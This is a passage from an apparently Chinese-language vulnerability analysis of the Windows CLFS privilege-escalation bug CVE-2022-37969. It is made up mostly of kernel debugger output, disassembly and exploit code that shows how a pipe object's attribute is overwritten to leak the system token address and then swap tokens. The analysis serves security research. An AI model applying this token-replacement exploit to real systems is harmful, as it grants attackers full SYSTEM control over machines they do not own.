[rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce3<span style="color:#ae81ff">85</span>c9 test ecx, ecx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce5<span style="color:#ae81ff">740</span>b je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce7<span style="color:#ae81ff">03</span>ca add ecx, edx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce9<span style="color:#ae81ff">894</span>c240c mov dword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch], ecx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ced<span style="color:#ae81ff">488</span>b442408 mov rax, qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2 c3 ret</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> redx</span></span><span style="display:flex;"><span>edx<span style="color:#f92672">=</span>ffffffff</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2 c3 ret</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf3 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf4 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf5 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf6 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf7 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf8 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf9 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span></code></pre></div><p>在<code>SeSetAccessStateGenericMapping</code>函数中，将rdx存储的指针复制到rcx+48存储的指针指向的内存中，前面调用<code>ClfsEarlierLsn</code>之后，rdx指向<code>0xFFFFFFFF</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0<span style="color:#ae81ff">488</span>b4148 mov rax, qword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da4<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1002</span> movups xmm0, xmmword ptr [rdx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da7 f30f7f4008 movdqu xmmword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], xmm0</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span></code></pre></div><p>在内存<code>0xFFFFFFFF</code>已经存储了一个指针，该指针指向了system token</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rdx</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffa48f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4149e000</span><span style="color:#ae81ff">41414141</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4141005</span>a</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000000f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000001f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000002f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000003f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000004f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000005f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000006f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v14<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xfff</span>;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xfffffffffffff000</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> dest2<span style="color:#f92672">=</span><span style="color:#ae81ff">0xffffffff</span>;</span></span><span style="display:flex;"><span> dest3<span style="color:#f92672">=</span><span style="color:#ae81ff">0x100000007</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> value2<span style="color:#f92672">=</span><span style="color:#ae81ff">0x414141414141005A</span>;</span></span><span style="display:flex;"><span> value3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> value3<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>value2;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 在0xffffffff地址分配0x100000大小的内存</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">VirtualAlloc</span>((LPVOID)dest2,<span style="color:#ae81ff">0x100000</span>,<span style="color:#ae81ff">0x3000</span>,<span style="color:#ae81ff">4</span>))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>((LPVOID)dest3,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xff8</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 写入system_EPROCESS &amp; 0xfffffffffffff000;</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">*</span>(UINT64<span style="color:#f92672">*</span>)dest2<span style="color:#f92672">=</span> v15;</span></span></code></pre></div><p>而rcx+48存储了pipe的<code>AttributeValueSize</code>的地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093e8</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093f</span><span style="color:#ae81ff">8</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9408</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9418</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9428</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9438</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9448</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9458</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span></code></pre></div><p>继续执行，将会把0xFFFFFFFF存储的指针写入到rax+8的地址上，内核中pipe对象的<code>AttributeValue</code> 值已经被覆盖为system token地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span></span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span></span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c000 b0<span style="color:#ae81ff">32</span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">27</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span>b0<span style="color:#ae81ff">32</span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">27</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#ae81ff">.2</span>.<span style="color:#960050;background-color:#1e0010">'</span>....<span style="color:#ae81ff">.2</span>.<span style="color:#960050;background-color:#1e0010">'</span>....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c010<span style="color:#ae81ff">28</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span>d6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> (..<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c020<span style="color:#f92672">**</span><span style="color:#ae81ff">00</span> e0<span style="color:#ae81ff">49</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">8f</span> a4 ff<span style="color:#f92672">**</span> ff<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>a<span style="color:#ae81ff">00</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> ..IA....Z.AAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c030<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c040<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c050<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c060<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c070<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span></code></pre></div><p>之后通过_NtFsControlFile并设ControlCode为0x110038，则会读取pipe对象的AttributeValue并写入到用户提供的缓冲区中，读取到这里已经读取到了system token的地址。</p><p>为了完成token替换，exp第二次触发漏洞，在触发之前堆内存进行布局。把system token地址布局到0xFFFFFFFF，从0x10008开始每隔0x10把自身token地址写入到该地址中</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/17.png"/></p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/18.png"/></p><p>触发漏洞（这里重新调试了，所以地址不一样），在CLFS!CClfsBaseFilePersisted::RemoveContainer中断下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> g</span></span><span style="display:flex;"><span>Breakpoint<span style="color:#ae81ff">1</span> hit</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">13</span>a66df8<span style="color:#ae81ff">488</span>bf8 mov rdi,rax</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd070<span style="color:#ae81ff">06</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>c6<span style="color:#ae81ff">6</span>c<span style="color:#ae81ff">11</span><span style="color:#ae81ff">93</span><span style="color:#ae81ff">9</span>c<span style="color:#ae81ff">15</span> ee<span style="color:#ae81ff">11</span> .........l......</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd080 bc<span style="color:#ae81ff">82</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">29</span><span style="color:#ae81ff">07</span> fc<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....).<span style="color:#ae81ff">.2</span>........</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd090<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0a0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0b0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0c0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0d0<span style="color:#ae81ff">38</span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8.</span>..............</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0e0<span style="color:#ae81ff">00</span><span 